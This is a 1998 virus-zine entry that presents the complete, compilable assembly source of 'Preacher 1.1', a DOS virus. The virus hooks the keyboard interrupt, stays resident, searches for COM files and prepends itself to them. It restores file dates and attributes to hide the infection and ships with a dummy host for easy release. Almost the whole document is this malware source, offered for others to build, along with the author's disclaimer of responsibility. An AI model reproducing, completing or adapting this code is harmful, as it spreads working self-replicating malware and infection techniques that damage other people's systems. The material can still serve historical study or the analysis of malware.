   ;
   ;   HEX-FILES No. 2                                                   File 002
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;                                 Preacher 1.1
   ;
   ;                                      by
   ;
   ;                                     Mikee
   ;
   ;
   ;
   ;     Preacher goes resident as a low memory TSR (one full segment!). It
   ;     hooks Int 09. Unlike majority of file infectors, it does not hook
   ;     int 21. Infection is carried through int 09 instead. To avoid
   ;     crashing the system, Preacher checks InDOS or the DOS busy flag to
   ;     check if DOS is processing an Int 21 function.
   ;
   ;     Preacher only infects COM files through DOS' find file functions. It
   ;     is prepended to programs and is 524 bytes long.  Contains texts
   ;     "PREACHER" (also used to check files for infection) and "Jesus
   ;     Reigns!".  These are not displayed.
   ;
   ;     Preacher is still on the development phase. You can expect a better
   ;     and expanded version in the future.
   ;
   ;
   ;  ÄÄ PREACHER.ASM STARTS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    ;-------------------------------------------------------------------
    ; HEX-FILES No. 2                                         March 1998
    ;-------------------------------------------------------------------
    ;
    ; Virus:        Preacher 1.1
    ; Author:       Mikee
    ; Date Written: 24 February 1998
    ; Origin:       Lagro, Novaliches, Quezon City, Philippines
    ;
    ;===================================================================
    ;
    ;                        * Dedication *
    ;
    ; This virii is dedicated to my loving girlfriend - Tata Nolasco and
    ; to my one and only Saviour - JESUS CHRIST!
    ;
    ; I give thanks to the source of my strength, patience, and wisdom
    ; who again is the Lord JESUS Christ.
    ;
    ;===================================================================
    ;
    ; This source code could be compiled in TASM or MASM.
    ; Compile to COM.
    ;
    ;-------------------------------------------------------------------
    ; Preacher 1.1 is made on a clean thought and on a principle of not
    ; damaging units it infects.  Any damages caused by it due either to
    ; modifications made by the holder or by bugs within the virii is by
    ; no means the progammer's responsibility.  All responsibility and
    ; precautions is in the hand of the end user.
    ;-------------------------------------------------------------------
    ;
     .model small
     .code

    ;-------------------------------------------------- constants
            _limit equ 100                  ; int 09 counter

    org 100h
    ;-------------------------------------------------- start of preacher virus
    start_preacher:

            jmp load_preacher

    ;-------------------------------------------------- virus signature
            preacher db "PREACHER"

    ;-------------------------------------------------- data area
            preacher_temp db '\p~~~tmp',0   ; temporary file

            maske db '*.com',0              ; target


    ;-------------------------------------------------- interrupt handler of
    ;-------------------------------------------------- preacher virus

    kernel_preacher proc far
            nop                             ; marker
            nop
            pushf
            call cs:old_int                 ; call old interrupt

            pushf
            inc cs:preacher_counter         ; increment counter
            cmp cs:preacher_counter,_limit  ; has it reached limit?
            je activate_preacher_kernel     ; yes - activate virus
            jmp exit_preacher_kernel_2      ; no - exit handler


    activate_preacher_kernel:
            push ax
            push bx
            push cx
            push dx
            push di
            push si
            push ds
            push es

            mov cs:preacher_counter,0       ; reset counter
            mov bx,cs:busy_off              ; get off and seg address
            mov es,cs:busy_seg              ; of indos
            cmp byte ptr es:[bx],0          ; int 21h issued?
            je proceed2                     ; no - continue
            jmp exit_preacher_kernel        ; yes - exit handler

    proceed2:
            sti                             ; enable interrupts &
            mov ah,2fh                      ; get address of current dta
            int 21h                         ;
            mov cs:dta_off,bx               ; and save it
            mov cs:dta_seg,es
            push cs
            push cs
            pop ds                          ; now set up segment registers
            pop es                          ; and set up preacher's
            mov dx,80h                      ; own disk transfer area
            mov ah,1ah
            int 21h

            mov ah,4eh                      ; search for first file to
            mov dx,offset maske             ; infect
            mov cx,0
            int 21h
            cmp ax,0                        ; found?
            je check_for_infection         ; yes - check if infected
            jmp restore_dta                 ; no - exit handler

    search_loop:
            mov ah,4fh                      ; search loop
            int 21h
            cmp ax,0                        ; no more files?
            je check_for_infection          ; no - check next file for infection
            jmp restore_dta                 ; yes - exit handler

    check_for_infection:                    ; check found file for infection
            mov bx,9ch                      ; is file to big?
            cmp word ptr[bx],0              ;
            jne search_loop                 ; yes - search next
            mov bx,9ah
            cmp word ptr[bx],0ffffh-preacher_len     ; is it still big?
            ja search_loop                  ; yes - search next
            mov dx,9eh
            mov ax,3d00h                    ; open file for read access
            int 21h
            jnc _001
            jmp restore_dta
    _001:
            mov bx,ax                       ; read 11 bytes into inbuf
            mov ah,3fh
            mov cx,11
            mov dx,offset inbuf
            int 21h
            mov si,offset start_preacher
            mov di,offset inbuf
            mov cx,11
            cld
            repe cmpsb                      ; first 11 bytes the same?
            jne next_check                  ; no - proceed with check
            mov ah,3eh                      ; yes - close file and
            int 21h
            jmp search_loop                 ; search next
    next_check:
            cmp cs:inbuf,'M'                ; is file starting with "M" (This is
                                            ; used to ensure that the file is a
                                            ; true com file and an exe file
                                            ; renamed to com)
            je search_loop                  ; yes - search next

    infect_file:                            ; infection routine
            mov ah,3eh                      ; close file previously opened by
            int 21h                         ; search & check
            mov dx,9eh
            mov ax,4301h                    ; set attributes to normal
            mov cx,0
            int 21h
            jc restore_dta

            mov ax,3d02h                    ; open for read/write
            mov dx,9eh
            int 21h
            jc restore_dta

            mov cx,cs:[9ah]                  ; get length of file
            mov cs:infect_len,cx

            mov bx,ax
            mov ah,3fh                      ; read cx bytes to end of virus
            mov dx,offset end_preacher
            int 21h

            mov ax,4200h                    ; reset r/w pointer to start of file
            mov cx,0
            mov dx,0
            int 21h

            mov dx,offset start_preacher    ; write preacher's code to start
            mov cx,preacher_len             ; of host file and append host
            add cx,cs:[9ah]
            mov ah,40h
            int 21h

            mov ax,5701h                    ; restore file date and time
            mov cx,cs:[96h]
            mov dx,cs:[98h]
            int 21h

            mov ah,3eh                      ; close file and
            int 21h

            mov ax,4301h                    ; restore attributes
            mov dx,9eh
            xor ch,ch
            mov cl,cs:[95h]
            int 21h

    ;-------------------------------------------------- infection finished
    restore_dta:
            mov ah,1ah                      ; restore DTA
            mov dx,cs:dta_off
            mov ds,cs:dta_seg
            int 21h

    exit_preacher_kernel:
            pop es
            pop ds
            pop si
            pop di
            pop dx
            pop cx
            pop bx
            pop ax
    exit_preacher_kernel_2:

            popf
            iret

    kernel_preacher endp

    ;-------------------------------------------------- the process to load virus
    ;-------------------------------------------------- into memory

    load_preacher:
            mov bx,4096                     ; free some memory space
            mov ah,4ah
            push cs
            pop es
            int 21h

    preacher_restore:                       ; restore host file by
            mov ah,3ch                      ; by creating temp file
            mov cx,2                        ; with hidden attribute
            mov dx,offset preacher_temp     ; then
            int 21h
            mov bx,ax
            jnc preacher_create_ok
            mov al,1
            jmp short found_preacher

    preacher_create_ok:
            mov ah,40h                      ; rewrite code to file
            mov cx,cs:infect_len
            mov dx,offset end_preacher
            int 21h

            mov ah,3eh                      ; and close temp file
            int 21h

            mov ax,cs                       ; set up paramaeter area
            mov cs:seg1,ax                  ; segment addresses for
            mov cs:seg2,ax                  ; program execution
            mov cs:seg3,ax

            mov ax,4b00h                    ; load and execute temp file
            mov bx,offset pararea
            mov dx,offset preacher_temp
            int 21h

    ;---------------------------------------------- return from host execution

            mov ah,3ch
            mov cx,2
            mov dx,offset preacher_temp
            int 21h
            mov bx,ax
            mov ah,3eh
            int 21h

            mov ax,3509h                    ; get address of int 9
            int 21h
            mov cs:word ptr old_int,bx      ; and save
            mov cs:word ptr old_int+2,es
            mov ax,word ptr kernel_preacher ; check if vector already points
            cmp es:[bx],ax                  ; to a loaded preacher
            je found_preacher               ; if so - do not load preacher

            mov ah,34h                      ; get address of dos busy flag
            int 21h
            mov cs:busy_seg,es
            mov cs:busy_off,bx

            mov ax,2509h                    ; else - set int 9 to kernel
            mov dx,offset kernel_preacher
            int 21h

            mov dx,0ffffh                   ; allocate 0ffffh space
            int 27h                         ; for resident virus and terminate

    found_preacher:

            mov ah,4ch                      ; terminate without staying in
            int 21h                         ; memory

            db 'Jesus Reigns!'              ; the preachers message

    pararea label byte                      ; parameter area for temp file
            dw 0                            ; execution
            dw 80h
            seg1 dw ?
            dw 5ch
            seg2 dw ?
            dw 6ch
            seg3 dw ?
            infect_len dw _len              ; length of infected file stored here

            busy_seg dw ?                   ; InDOS segment
            busy_off dw ?                   ; and offset
            old_int dd ?                    ; old interrupt vector
            preacher_counter dw 0           ; counter
            dta_off dw ?                    ; offset of dta saved here
            dta_seg dw ?                    ; segment of dta saved here

    end_preacher:

    preacher_len equ $-start_preacher       ; length of preacher

    inbuf   db 90h

    INT 20H ; this is not part of the actual virus but is included
            ; as a dummy host to make installation of virus easy

    _len equ $-end_preacher ; length of dummy host

    end start_preacher

    ;-----------------------------End of Virus----------------------------

    ; ÄÄ PREACHER.ASM ENDS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


